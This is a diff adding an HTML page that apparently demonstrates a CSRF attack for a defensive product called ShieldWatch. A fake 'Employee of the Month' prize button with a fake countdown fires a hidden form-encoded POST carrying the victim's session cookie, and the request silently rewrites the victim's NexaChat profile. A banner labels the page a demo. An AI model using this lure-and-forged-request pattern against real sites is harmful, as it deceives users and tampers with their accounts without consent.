@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 You Won a Free Prize! — NexaCorp Rewards</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+    .card {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 48px 56px;
+      text-align: center;
+      max-width: 500px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    }
+    .emoji { font-size: 72px; margin-bottom: 24px; display: block; }
+    h1 { font-size: 2rem; font-weight: 700; margin-bottom: 12px; color: #fbbf24; }
+    p  { color: rgba(255,255,255,0.7); line-height: 1.6; margin-bottom: 20px; }
+    .btn {
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      border: none; border-radius: 12px;
+      color: #fff; font-size: 1.1rem; font-weight: 600;
+      padding: 14px 36px; cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(239,68,68,0.4); }
+    .status {
+      margin-top: 24px; padding: 12px 20px; border-radius: 8px;
+      font-size: 0.9rem; display: none;
+    }
+    .status.success { background: rgba(16,185,129,0.2); border: 1px solid #10b981; color: #10b981; }
+    .status.blocked { background: rgba(239,68,68,0.2); border: 1px solid #ef4444; color: #ef4444; }
+    .fine-print {
+      margin-top: 16px; font-size: 0.7rem; color: rgba(255,255,255,0.2);
+      max-width: 380px; margin-left: auto; margin-right: auto; line-height: 1.4;
+    }
+    .shieldwatch-banner {
+      margin-top: 24px; padding: 10px 16px; border-radius: 8px;
+      background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3);
+      font-size: 0.8rem; color: rgba(239,68,68,0.8);
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <span class="emoji">🎁</span>
+  <h1>Congratulations!</h1>
+  <p>You have been selected as this month's <strong>NexaCorp Employee of the Month</strong>!</p>
+  <p>Click below to claim your reward. This offer expires in <strong id="timer">59</strong> seconds.</p>
+
+  <button class="btn" id="claimBtn" onclick="claimPrize()">🎉 Claim My Reward</button>
+
+  <div class="status" id="status"></div>
+
+  <p class="fine-print">
+    * By clicking Claim, you agree to receive your reward. This promotion is valid for NexaCorp employees only.
+    NexaCorp Rewards Program. Prize delivery within 5–7 business days.
+  </p>
+
+  <div class="shieldwatch-banner">
+    🔴 <strong>DEMO:</strong> This page performs a CSRF attack in the background.<br>
+    It silently changes your NexaChat profile without your knowledge.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     HIDDEN CSRF FORM — victim never sees this
+     Auto-submits to /api/profile/update using the victim's session cookie
+     ════════════════════════════════════════════════════ -->
+<form id="csrfForm" action="/api/profile/update" method="POST"
+      style="display:none;" enctype="application/x-www-form-urlencoded">
+  <input type="hidden" name="bio"          value="⚠️ HACKED via CSRF by an external page! Your profile was modified without your consent.">
+  <input type="hidden" name="avatar_color" value="#ef4444">
+  <input type="hidden" name="username"     value="">
+</form>
+
+<script>
+  // ── Countdown timer (urgency trick) ──────────────────────────────────────────
+  let t = 59;
+  const timerEl = document.getElementById('timer');
+  const countdown = setInterval(() => {
+    t--;
+    if (t <= 0) { clearInterval(countdown); timerEl.textContent = '0'; }
+    else timerEl.textContent = t;
+  }, 1000);
+
+  // ── CSRF Attack ───────────────────────────────────────────────────────────────
+  // Sends a cross-site form POST to /api/profile/update using the victim's session cookie.
+  // The browser automatically includes the session cookie → server thinks it's a legit request.
+  //
+  // Without ShieldWatch: profile gets silently changed
+  // With ShieldWatch ON: form-encoded POST to /api/profile/update → BLOCKED (403)
+  function claimPrize() {
+    const btn = document.getElementById('claimBtn');
+    const statusEl = document.getElementById('status');
+    btn.textContent = '⏳ Claiming reward…';
+    btn.disabled = true;
+
+    const form = document.getElementById('csrfForm');
+    const data = new FormData(form);
+    const body = new URLSearchParams(data).toString();
+
+    fetch('/api/profile/update', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body,
+      credentials: 'include',   // ← sends victim's session cookie automatically
+    })
+    .then(r => r.json())
+    .then(d => {
+      statusEl.style.display = 'block';
+      if (d.blocked) {
+        statusEl.className = 'status blocked';
+        statusEl.innerHTML = '🛡️ <strong>ShieldWatch BLOCKED the CSRF attack!</strong><br>Your profile was NOT modified.';
+        btn.textContent = '❌ Attack Blocked';
+      } else if (d.ok) {
+        statusEl.className = 'status success';
+        statusEl.innerHTML = '💀 <strong>CSRF SUCCESSFUL — No ShieldWatch!</strong><br>Profile silently changed. Check your NexaChat profile!';
+        btn.textContent = '😈 Attack Succeeded';
+      } else {
+        statusEl.className = 'status blocked';
+        statusEl.innerHTML = '⚠️ ' + (d.error || 'Unexpected response');
+        btn.textContent = 'Try Again';
+        btn.disabled = false;
+      }
+    })
+    .catch(() => {
+      statusEl.style.display = 'block';
+      statusEl.className = 'status blocked';
+      statusEl.innerHTML = '❌ Request failed — check browser console.';
+      btn.textContent = 'Failed';
+    });
+  }
+</script>
+</body>
+</html>
